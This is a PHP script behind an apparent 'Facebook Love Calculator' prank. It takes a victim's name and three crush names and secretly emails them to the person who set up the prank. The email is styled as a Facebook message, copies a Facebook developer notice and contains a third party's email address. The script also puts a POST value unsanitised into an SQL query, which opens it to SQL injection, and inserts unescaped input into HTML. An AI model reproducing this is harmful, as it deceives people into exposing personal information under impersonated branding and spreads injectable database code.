<?php
session_start();

include 'connection.php';
$url = $_POST['URL'];
$FoolName = $_POST['FoolName'];
$stCrush = $_POST['stCrush'];
$ndCrush = $_POST['ndCrush'];
$rdCrush = $_POST['rdCrush'];

$sql = "SELECT * FROM register WHERE id='$url'";
$result = mysqli_query($conn, $sql);
if(mysqli_num_rows($result) > 0){
    while($row = mysqli_fetch_assoc($result)){
		//echo $row["id"];
		$YourName = $row["YourName"];
		$YourEmail = $row["YourEmail"];
		//echo $row["URL"];
    }
}else{
	echo "not fetched data from db";
}
//for fooled page begins
$_SESSION['FoolName'] = $FoolName;
$_SESSION['FoolByYourName'] = $YourName;
$_SESSION['FoolByYourEmail'] = $YourEmail;
//for fooled page ends

//send email begins	
$SubFooled = "You have fooled ".$FoolName;

require("PHPMailer_5.2.4/class.phpmailer.php");
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPAuth = true;
$body="<body><div id=\"bodyreadMessagePartBodyControl712f\" class=\"ExternalClass MsgBodyContainer\" data-link=\"class{:~tag.cssClasses(PlainText, IsContentFiltered)}\"><title>Facebook</title><table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"40\"><tbody><tr><td bgcolor=\"#f7f7f7\" width=\"100%\" style=\"font-family:'lucida grande',tahoma,verdana,arial,sans-serif;\"><table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"620\"><tbody><tr><td style=\"background:#3b5998;color:#FFFFFF;font-weight:bold;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;vertical-align:middle;padding:4px 8px;font-size:16px;letter-spacing:-0.03em;text-align:left;\">facebook Love Calculator</td><td style=\"background:#3b5998;color:#FFFFFF;font-weight:bold;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;vertical-align:middle;padding:4px 8px;font-size:11px;text-align:right;\"></td></tr><tr><td colspan=\"2\" style=\"background-color:#FFFFFF;border-bottom:1px solid #3b5998;border-left:1px solid #CCCCCC;border-right:1px solid #CCCCCC;padding:15px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;\" valign=\"top\"><table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td width=\"100%\" style=\"font-size:12px;\" valign=\"top\" align=\"left\"><div style=\"font-size:12px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;\">Hi ".$YourName.",</div><div style=\"\">Your friend has been fooled by you. The information entered by him is:</div><div style=\"\"><div style=\"border-bottom:1px solid #cccccc;line-height:5px;\">&nbsp;</div><br><div style=\"padding:2px 2px 3px 8px;border-left:5px solid green;\"><div><h3 style=\"font-size:14px;\"><p style=\"color:#3b5998;text-decoration:none;\"><b>Name: ".$FoolName."<br>Crush Name(s): (1) ".$stCrush.", (2) ".$ndCrush.", and (3) ".$rdCrush."</b></p></h3></div><div style=\"color:#666666;font-size:10px;\">Tomorrow, November 5 at 2:20am</div>We are currently experiencing some issues with our Messaging backend which may increase errors and latency for calls to Messaging APIs. Our engineers are working to resolve these issues as quickly as possible.</div><br><div style=\"border-bottom:1px solid #cccccc;line-height:5px;\">&nbsp;</div></div><div style=\"\"></div></td></tr></tbody></table><br><table cellspacing=\"0\" cellpadding=\"0\" style=\"border-collapse:collapse;width:100%;\"><tbody><tr><td style=\"font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px;background-color:#fff9d7;border-left:1px solid #e2c822;border-right:1px solid #e2c822;border-top:1px solid #e2c822;border-bottom:1px solid #e2c822;\"><div style=\"font-weight:bold;font-size:11px;\">Find out more information and get status updates here:</div><a href=\"http://developers.facebook.com/status/issues/816418688452225/\" style=\"color:#3b5998;text-decoration:none;font-size:11px;\" target=\"_blank\">http://developers.facebook.com/status/issues/816418688452225/</a></td></tr></tbody></table></td></tr><tr><td colspan=\"2\" style=\"color:#999999;padding:10px;font-size:12px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;\"><br>This message was intended for mdaliakhtar@outlook.com. You are receiving this email because you have chosen to receive developer updates from Facebook. Want to control which developer updates you receive? Go to:<br><a href=\"http://developers.facebook.com/settings\" target=\"_blank\">http://developers.facebook.com/settings</a><br>Facebook, Inc., Attention: Department 415, PO Box 10005, Palo Alto, CA 94303<br></td></tr></tbody></table></td></tr></tbody></table></div></body>";
$mail->AddAddress($YourEmail);
$mail->Subject = $SubFooled;
$mail->MsgHTML($body);
$mail->Header='Content-type: text/html; charset=iso-8859-1';
if(!$mail->Send())
	echo "Error sending: ".$mail->ErrorInfo;
else
	//echo 'email is sent!';
	header('Location: ../fooled.php');
	
//send email ends

include 'connection-close.php';
?>